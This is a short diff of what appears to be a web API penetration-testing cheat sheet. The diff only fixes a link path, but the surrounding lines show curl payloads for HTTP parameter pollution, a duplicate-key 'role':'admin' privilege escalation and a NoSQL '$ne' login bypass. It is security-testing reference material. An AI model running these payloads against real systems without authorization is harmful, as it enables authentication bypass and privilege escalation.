@@ -164,7 +164,7 @@ curl -s -X POST "https://$H/api/v1/x" -H "$A" -H 'Content-Type: application/xml'
 # HTTP parameter pollution:
 curl -s "https://$H/api/v1/orders?id=1001&id=1002" -H "$A"
 curl -s -X POST "https://$H/api/v1/x" -H "$A" -H 'Content-Type: application/json' -d '{"role":"user","role":"admin"}'   # duplicate JSON key
-# NoSQL operator injection (auth bypass / over-match): see ../../Web/SQLi/ NoSQLi note
+# NoSQL operator injection (auth bypass / over-match): see ../../Web/NoSQLi/
 curl -s -X POST "https://$H/api/v1/login" -H 'Content-Type: application/json' -d '{"email":"a@test.tld","password":{"$ne":null}}'
 # injection into path/param -> SQLi/cmdi/SSTI/LFI/LDAP kits
 ```
